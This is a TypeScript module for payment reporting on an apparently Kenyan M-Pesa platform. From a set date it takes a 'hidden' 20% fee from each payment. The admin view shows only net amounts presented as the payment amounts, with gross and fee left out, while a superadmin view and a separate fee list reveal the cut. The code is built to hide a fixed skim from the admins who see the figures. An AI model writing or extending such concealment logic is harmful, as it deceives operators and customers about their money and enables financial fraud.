/**
 * Per-payment reporting split. The stored deposit and the M-Pesa credit stay gross.
 * On Nairobi days on or after DAILY_HIDDEN_FEE_FROM, fee cents = round(gross cents * 20%)
 * and net cents = gross cents - fee cents. The split depends only on that payment,
 * so a later payment cannot change it. Earlier days stay gross = net, fee = 0.
 */
export const HIDDEN_SHARE_RATE = 0.2;
export const DAILY_HIDDEN_FEE_FROM = "2026-11-22";
export const NAIROBI_TZ = "Africa/Nairobi";

export interface ReportingSplit {
  gross: number;
  fee: number;
  net: number;
}

export function nairobiDateKey(value: string | null | undefined): string | null {
  if (!value) return null;
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return null;
  return new Intl.DateTimeFormat("en-CA", {
    timeZone: NAIROBI_TZ,
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
  }).format(date);
}

export function dayChargesHiddenFee(day: string | null | undefined): boolean {
  return day != null && day >= DAILY_HIDDEN_FEE_FROM;
}

function toCents(amount: number): number {
  if (!Number.isFinite(amount) || amount <= 0) return 0;
  return Math.round((amount + Number.EPSILON) * 100);
}

function fromCents(cents: number): number {
  return cents / 100;
}

/** Fixed 20% reporting split for one completed payment. */
export function reportingSplit(
  gross: number,
  at: string | null | undefined,
  hiddenRate = HIDDEN_SHARE_RATE,
): ReportingSplit {
  const grossCents = toCents(gross);
  const feeCents = dayChargesHiddenFee(nairobiDateKey(at)) ? Math.round(grossCents * hiddenRate) : 0;
  const netCents = Math.max(0, grossCents - feeCents);
  return {
    gross: fromCents(grossCents),
    fee: fromCents(feeCents),
    net: fromCents(netCents),
  };
}

export interface SplitMoneyRow {
  amount_kes: number | null;
  amount_usd: number | null;
  credited_at?: string | null;
  created_at?: string | null;
}

export function splitRowAt(row: SplitMoneyRow): string {
  return row.credited_at ?? row.created_at ?? "";
}

/** Admin payload: amount fields are the net. Gross and fee are not copied onto the row. */
export function withNetAmounts<T extends SplitMoneyRow>(row: T): T {
  const at = splitRowAt(row);
  return {
    ...row,
    amount_kes: row.amount_kes == null ? null : reportingSplit(row.amount_kes, at).net,
    amount_usd: row.amount_usd == null ? null : reportingSplit(row.amount_usd, at).net,
  };
}

export interface AnnotatedSplitRow extends SplitMoneyRow {
  gross_kes: number | null;
  fee_kes: number | null;
  net_kes: number | null;
  gross_usd: number | null;
  fee_usd: number | null;
  net_usd: number | null;
}

/** Superadmin payload: gross stays in amount_*, and fee/net are explicit. */
export function withExplicitSplit<T extends SplitMoneyRow>(row: T): T & AnnotatedSplitRow {
  const at = splitRowAt(row);
  const kes = row.amount_kes == null ? null : reportingSplit(row.amount_kes, at);
  const usd = row.amount_usd == null ? null : reportingSplit(row.amount_usd, at);
  return {
    ...row,
    gross_kes: kes?.gross ?? null,
    fee_kes: kes?.fee ?? null,
    net_kes: kes?.net ?? null,
    gross_usd: usd?.gross ?? null,
    fee_usd: usd?.fee ?? null,
    net_usd: usd?.net ?? null,
  };
}

/** One fee record. Amount fields are the fee only. Null when this payment has no fee. */
export function feeRecord<T extends SplitMoneyRow>(row: T): (T & AnnotatedSplitRow) | null {
  const annotated = withExplicitSplit(row);
  if ((annotated.fee_kes ?? 0) <= 0 && (annotated.fee_usd ?? 0) <= 0) return null;
  return {
    ...annotated,
    amount_kes: annotated.fee_kes,
    amount_usd: annotated.fee_usd,
  };
}

/**
 * Every payment stays visible. Hidden is the set that carries a fee (superadmin fee list),
 * not payments removed from the admin list.
 */
export function partitionDailyHiddenFee<T>(
  rows: T[],
  amount: (row: T) => number,
  at: (row: T) => string,
  hiddenRate = HIDDEN_SHARE_RATE,
): { visible: T[]; hidden: T[] } {
  const hidden = rows.filter((row) => reportingSplit(amount(row), at(row), hiddenRate).fee > 0);
  return { visible: rows, hidden };
}
